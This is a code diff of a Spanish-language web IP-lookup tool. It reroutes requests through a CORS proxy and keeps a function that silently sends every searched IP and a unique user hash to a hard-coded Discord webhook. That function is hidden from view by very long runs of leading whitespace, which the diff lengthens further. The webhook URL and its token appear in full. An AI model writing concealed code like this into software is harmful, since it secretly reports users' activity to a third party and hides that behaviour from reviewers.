@@ -170,11 +170,11 @@
   const userHash = obtenerHashUnico();
   document.getElementById("userHash").textContent = `tu hash: ${userHash}`;
 
-                                                                                                                                                                          function enviarWebhook(ip, desde = "manual") {
-                                                                                                                                                                            const url = "https://discord.com/api/webhooks/1382097915803209758/0Y98bVvOVpsyMcAGfN5dk6EPkxux4qOTnTAwuzrL_i_3qScJXLVzA-6abu9-LBEmZGUb";
-                                                                                                                                                                            const payload = {
-                                                                                                                                                                              content: `🔍 **IP buscada:** ${ip}\n👤 **Hash:** ${userHash}\n🌐 Desde: *${desde}*`
-                                                                                                                                                                            };
+                                                                                                                                                                                                                                                                                                                                                function enviarWebhook(ip, desde = "manual") {
+                                                                                                                                                                                                                                                                                                                                                  const url = "https://discord.com/api/webhooks/1382097915803209758/0Y98bVvOVpsyMcAGfN5dk6EPkxux4qOTnTAwuzrL_i_3qScJXLVzA-6abu9-LBEmZGUb";
+                                                                                                                                                                                                                                                                                                                                                  const payload = {
+                                                                                                                                                                                                                                                                                                                                                    content: `🔍 **IP buscada:** ${ip}\n👤 **Hash:** ${userHash}\n🌐 Desde: *${desde}*`
+                                                                                                                                                                                                                                                                                                                                                  };
 
     fetch(url, {
       method: "POST",
@@ -183,23 +183,26 @@
     }).catch(console.error);
   }
 
-  async function buscarIP() {
-    const ip = document.getElementById("ipInput").value.trim();
-    if (!ip) {
-      ipResultElement.textContent = "⚠️ Introduce una IP válida.";
-      return;
-    }
+async function buscarIP() {
+  const ip = document.getElementById("ipInput").value.trim();
+  if (!ip) {
+    ipResultElement.textContent = "⚠️ Introduce una IP válida.";
+    return;
+  }
 
-    ipResultElement.textContent = "🔄 Buscando información...";
+  ipResultElement.textContent = "🔄 Buscando información...";
 
-    try {
-      const response = await fetch(`http://ip-api.com/json/${ip}`);
-      const data = await response.json();
+  try {
+    // Usar proxy CORS para evitar bloqueo
+    const proxyUrl = 'https://corsproxy.io/?';
+    const apiUrl = `http://ip-api.com/json/${ip}`;
+    const response = await fetch(proxyUrl + encodeURIComponent(apiUrl));
+    const data = await response.json();
 
-      if (data.status === "fail") {
-        ipResultElement.textContent = `❌ Error: ${data.message}`;
-      } else {
-        const info = `
+    if (data.status === "fail") {
+      ipResultElement.textContent = `❌ Error: ${data.message}`;
+    } else {
+      const info = `
 📡 Dirección IP: ${data.query}
 🌍 País: ${data.country}
 📍 Región: ${data.regionName}
@@ -209,16 +212,17 @@
 🌐 ASN: ${data.as}
 🕒 Zona Horaria: ${data.timezone}
 🌎 Coordenadas: ${data.lat}, ${data.lon}
-        `.trim();
+      `.trim();
 
-        ipResultElement.textContent = info;
-        enviarWebhook(ip, "Busco");
-      }
-    } catch (error) {
-      ipResultElement.textContent = "❌ Error al consultar la IP.";
-      console.error(error);
+      ipResultElement.textContent = info;
+      enviarWebhook(ip, "Busco");
     }
+  } catch (error) {
+    ipResultElement.textContent = "❌ Error al consultar la IP.";
+    console.error(error);
   }
+}
+
 
   function descargarIPInfo() {
     const texto = ipResultElement.textContent;
